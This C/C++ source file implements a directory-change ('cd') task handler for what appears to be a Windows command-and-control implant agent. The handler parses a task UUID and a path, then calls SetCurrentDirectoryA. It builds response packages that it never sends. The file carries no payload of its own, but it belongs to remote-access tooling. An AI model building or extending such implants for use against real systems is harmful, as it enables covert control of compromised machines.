#include "cd.h"
#include <windows.h>
#include <string>

BOOL executeCd(PParser arguments)
{

    SIZE_T uuidLength = 36;
	PCHAR taskUuid = getString(arguments, &uuidLength);
	UINT32 nbArg = getInt32(arguments);
	SIZE_T size = 0;
    PCHAR newDir = getString(arguments, &size);
	newDir = (PCHAR)LocalReAlloc(newDir, size + 1, LMEM_MOVEABLE | LMEM_ZEROINIT);

	PPackage responseTask = newPackage(POST_RESPONSE, TRUE);
	addString(responseTask, taskUuid, FALSE);

    // Temporary output to store the result
	PPackage output = newPackage(0, FALSE);
    // Check if the directory exists before changing
    if (SetCurrentDirectoryA(newDir))
    {
        currentDirectory = newDir;  // Update global directory
        return TRUE;
    }
    else
    {
        _err("[CD] Directory change failed");
        return FALSE;
    }
}